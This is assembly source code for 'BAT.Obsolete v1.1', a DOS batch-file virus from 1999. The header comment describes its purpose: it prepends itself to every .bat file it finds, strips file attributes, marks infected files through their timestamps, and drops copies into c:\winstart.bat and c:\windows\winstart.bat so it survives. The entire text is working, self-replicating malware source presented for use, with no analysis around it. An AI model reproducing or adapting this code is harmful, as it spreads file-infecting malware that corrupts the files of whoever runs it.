

comment %

 BAT.Obsolete v1.1

 This is another form of simple outdated technology.
 Obsolete is a bat file infector. It infects via prepending. 
 When it runs out of resources it drops itself to c:\winstart.bat
 and c:\windows\winstart.bat in an attempt to preserve infection.
 Coded sometime in march, with no intention of doing anything 
 interesting in the first place.

 To everyone who has learned they are replaceable...

%

.model tiny
.code
   code segment
      assume cs:code,ds:code
      org 100h

start:
	db	'::'
	jmp	com_code
        db      0dh,0ah
	db	'@echo off',0dh,0ah
        db      'copy /b %0+%0.bat n.com>NUL',0dh,0ah
comfile db      'n.com',0
	db	0dh,0ah
	db	'::'
com_code:

	mov	ah,41h
	xor	cx,cx
	lea	dx,comfile
	int	21h
findfirst:

	mov	ah,4eh
	mov	cx,7
	lea	dx,fileb
	int	21h
	jnc	infect

exit:
	mov	ah,3ch
	xor	cx,cx
	lea	dx,win
	push	dx
	int	21h
	mov	ax,3d02h
	pop	dx
	int	21h
	mov     ah,40h
	lea     dx,start
	mov     cx,endow-start
	push	ax dx cx
	int     21h
	mov     ah,3eh
	int     21h
	mov	ah,3ch
	xor	cx,cx
	lea	dx,wind
	push	dx
	int	21h
	mov     ax,3d02h
	pop	dx
	int     21h
	pop	cx dx ax
	int     21h
	mov     ah,3eh
	int     21h
	mov     ax,4c00h			; i killed myself
	int     21h
infect:
	mov	ax,4300h
	mov     dx,offset 9eh
	int	21h
	push	cx
	mov     ax,4301h
	xor     cx,cx
	int	21h
        mov     ax,3d02h
	mov     dx,offset 9eh
        int     21h
        xchg    bx,ax
	mov	ax,5700h			; function to get timestamp
	int	21h
	push	cx				; time
	push	dx				; date
	xchg	ax,cx
        cmp	al,1eh				; if al=30 (seconds div 2)
        je	close				; then leave it alone.
	mov	ah,3fh
	mov	cx,ds:[9ah]
	push	cx
	lea	dx,endow
	int	21h
	mov	ax,4200h
	xor	cx,cx
	cwd
	int	21h
	mov     ah,40h
	lea     dx,start
	mov     cx,endow-start
	int     21h
	mov	ah,40h
	pop	cx
	lea	dx,endow			; write original batch code
	int	21h

close:
	mov	ax,5701h			; function to set timestamp
	pop	dx				; date
	pop	cx				; time
        mov	cl,1eh				; infection marker
	int	21h
	mov     ah,3eh
	int     21h
	mov	ax,4301h
	pop	cx
	mov     dx,offset 9eh
	int	21h
	mov	ah,4fh
	int	21h
	jnc	infect
	jmp	exit

fileb	db '*.bat',0
wind	db 'c:\windows\winstart.bat',0
win	db 'c:\winstart.bat',0
        db 0dh,0ah
vname	db ':: BAT.Obsolete v1.1 (c) nucleii 1999',0
        db 0dh,0ah
endow:

code ends
     end start

